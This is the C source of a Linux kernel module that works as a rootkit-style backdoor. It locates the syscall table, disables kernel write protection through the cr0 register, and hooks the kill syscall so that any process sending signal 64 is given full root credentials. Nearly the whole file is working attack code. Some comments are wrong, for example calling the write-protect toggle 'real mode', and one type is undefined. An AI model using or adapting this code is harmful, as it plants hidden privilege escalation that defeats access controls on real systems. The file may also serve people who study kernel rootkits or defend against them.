#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/version.h>

#define LICENSE			"GPL"
#define AUTHOR			"Chronolator"
#define DESCRIPTION		"LKM example of setting process to root perms."
#define VERSION			"0.01"

/* Module meta data */
MODULE_LICENSE(LICENSE);
MODULE_AUTHOR(AUTHOR);
MODULE_DESCRIPTION(DESCRIPTION);
MODULE_VERSION(VERSION);

/* Preprocessing Definitions */
#define MODULE_NAME "SetRootPerms"
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
#define KPROBE_LOOKUP 1
#include <linux/kprobes.h>
static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name"
};
#endif

/* Function Prototypes*/
unsigned long *get_syscall_table_bf(void);
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
static inline void write_cr0_forced(unsigned long val);
#endif
static inline void SetProtectedMode(void);
static inline void SetRealMode(void);
void give_root(void);
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
asmlinkage long (*original_kill)(const struct pt_regs *regs);
asmlinkage long hacked_kill(const struct pt_regs *regs);
#else
asmlinkage long (*original_kill)(int pid, int sig);
asmlinkage long hacked_kill(int pid, int sig);
#endif

/* Global Variables */
unsigned long cr0;
static unsigned long *__sys_call_table;

/* Get syscall table */
unsigned long *get_syscall_table_bf(void) {
    unsigned long *syscall_table;
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 4, 0)
#ifdef KPROBE_LOOKUP
    typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
    kallsyms_lookup_name_t kallsyms_lookup_name;
    register_kprobe(&kp);
    kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
    unregister_kprobe(&kp);
#endif
    syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
    return syscall_table;
#else
    unsigned long int i;

    for (i = (unsigned long int)sys_close; i < ULONG_MAX; i += sizeof(void *)) {
        syscall_table = (unsigned long *)i;
    if (syscall_table[__NR_close] == (unsigned long)sys_close)
        return syscall_table;
    }
    return NULL;
#endif
}

/* Bypass write_cr0() restrictions by writing directly to the cr0 register */
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
static inline void write_cr0_forced(unsigned long val) {
    unsigned long __force_order;
    asm volatile(
        "mov %0, %%cr0"
        : "+r"(val), "+m"(__force_order)
    );
}
#endif

/* Set CPU to protected mode by modifying value stored in cr0 register */
static inline void SetProtectedMode(void) {
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
    write_cr0_forced(cr0);
#else
    write_cr0(cr0);
#endif
}

/* Set CPU to real mode by modifying value stored in cr0 register */
static inline void SetRealMode(void) {
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
    write_cr0_forced(cr0 & ~0x00010000);
#else
    write_cr0(cr0 & ~0x00010000);
#endif
}

/* Misc Functions */
void give_root(void) {
#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 29)
    current->uid = current->gid = 0;
    current->euid = current->egid = 0;
    current->suid = current->sgid = 0;
    current->fsuid = current->fsgid = 0;
#else
    struct cred *newcreds;
    newcreds = prepare_creds();
    if (newcreds == NULL)
        return;
    #if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 5, 0) && defined(CONFIG_UIDGID_STRICT_TYPE_CHECKS) || LINUX_VERSION_CODE >= KERNEL_VERSION(3, 14, 0)
        newcreds->uid.val = newcreds->gid.val = 0;
        newcreds->euid.val = newcreds->egid.val = 0;
        newcreds->suid.val = newcreds->sgid.val = 0;
        newcreds->fsuid.val = newcreds->fsgid.val = 0;
    #else
        newcreds->uid = newcreds->gid = 0;
        newcreds->euid = newcreds->egid = 0;
        newcreds->suid = newcreds->sgid = 0;
        newcreds->fsuid = newcreds->fsgid = 0;
    #endif
    commit_creds(newcreds);
#endif
}

/* Hacked Syscalls */
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
asmlinkage long hacked_kill(const struct pt_regs *regs) {
    printk(KERN_WARNING "%s module: Called syscall kill", MODULE_NAME);
    
    pid_t pid = regs->di;
    int sig = regs->si;

    if(sig == 64) {
        printk(KERN_INFO "%s module: Giving root\n", MODULE_NAME);
        give_root();        

        return 0;
    }
    
    return (*original_kill)(regs);
}
#else
asmlinkage long hacked_kill(int pid, int sig) {
    printk(KERN_WARNING "%s module: Called syscall kill", MODULE_NAME);

    //struct task_struct *task;
    if(sig == 64) {
        printk(KERN_INFO "%s module: Giving root\n", MODULE_NAME);
        give_root(); 

        return 0;
    }

    return (*original_kill)(pid, sig);
}
#endif

/* Init */
static int __init run_init(void) {
    printk(KERN_INFO "%s module: Initializing module\n", MODULE_NAME);
    // Get syscall table 
    __sys_call_table = get_syscall_table_bf();
    if (!__sys_call_table)
        return -1;

    // Get the value in the cr0 register
    cr0 = read_cr0();

    // Set the actual syscalls to the "original" linked versions
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
    original_kill = (t_syscall)__sys_call_table[__NR_kill];
#else
    original_kill = (void*)__sys_call_table[__NR_kill];
#endif

    // Set the syscalls to your modified versions
    SetRealMode();
    __sys_call_table[__NR_kill] = (unsigned long)hacked_kill;
    SetProtectedMode();

    return 0;
}

/* Exit */
static void __exit run_exit(void) {
    printk(KERN_INFO "%s module: Exiting module\n", MODULE_NAME);

    // Set the syscalls back to the "original" linked versions
    SetRealMode();
    __sys_call_table[__NR_kill] = (unsigned long)original_kill;
    SetProtectedMode();

    return;
}

module_init(run_init);
module_exit(run_exit);
